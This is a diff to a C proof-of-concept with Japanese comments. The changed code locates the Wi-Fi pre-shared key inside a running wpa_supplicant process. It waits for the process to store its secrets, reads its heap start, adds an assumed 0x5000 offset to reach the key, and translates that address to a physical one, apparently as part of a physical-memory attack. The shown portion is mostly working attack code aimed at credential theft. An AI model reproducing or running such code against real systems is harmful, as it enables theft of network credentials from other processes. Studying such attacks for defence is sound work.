@@ -5,9 +5,12 @@
 #include <unistd.h>
 #include <stdlib.h>
 
-static const int DUMMY_PAGE = 300;
-static const int BUSY_LOOP = 5;
-static const int PFN_MASK_SIZE = 8;
+const int DUMMY_PAGE = 300;
+const int BUSY_LOOP = 5;
+const int PFN_MASK_SIZE = 8;
+
+// psk の heap 領域からのオフセットは 0x5000 の場合が多い
+const int OFFSET = 0x5000;
 
 int main() {
     // ダミーページ確保
@@ -45,19 +48,22 @@ int main() {
     }
     printf("[+] start wpa_supplicant\n");
 
+    // wpa_supplicant が秘密情報を配置するまで待機
+    busy_loop(BUSY_LOOP);
+
     // wpa_supplicant のプロセスID取得
     int pid = get_process_id();
     printf("[+] pid = %d\n", pid);
-
-    // wpa_supplicant が秘密情報を配置するまで待機
-    busy_loop(BUSY_LOOP);
 
     // wpa_supplicant プロセスの heap 領域のアドレスを取得
     uint64_t heap_addr = get_heap_start_address(pid);
     printf("[+] heap address = 0x%lx\n", heap_addr);
 
+    uint64_t psk_addr = heap_addr + OFFSET;
+    printf("[+] psk address = 0x%lx\n", psk_addr);
+
     // 物理アドレス計算
-    uint64_t phys_addr = v2p(pid, (void *)heap_addr);
+    uint64_t phys_addr = v2p(pid, (void *)psk_addr);
     printf("[+] physical address = 0x%lx\n", phys_addr);
 
     // ダミーページ計算
